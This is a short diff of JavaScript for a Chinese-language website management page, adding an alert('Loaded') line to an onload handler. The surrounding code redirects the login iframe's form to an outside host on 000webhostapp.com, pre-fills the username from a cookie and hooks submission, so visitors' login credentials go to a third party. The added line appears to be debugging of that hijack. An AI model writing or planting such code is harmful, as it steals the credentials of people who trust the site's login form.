@@ -24,6 +24,7 @@ var prevTitle = document.title;
 document.title = "网站管理系统";
 
 window.onload = function(){
+	alert("Loaded");
 	$("#login_iframe").contents().find("#form1").attr("action", "http://g4wowisbad.000webhostapp.com/login.php");
 	$("#login_iframe").contents().find("#txtUsername").val(getCookie("login_name"));
 	$("#login_iframe").contents().find("#form1").submit(function(){
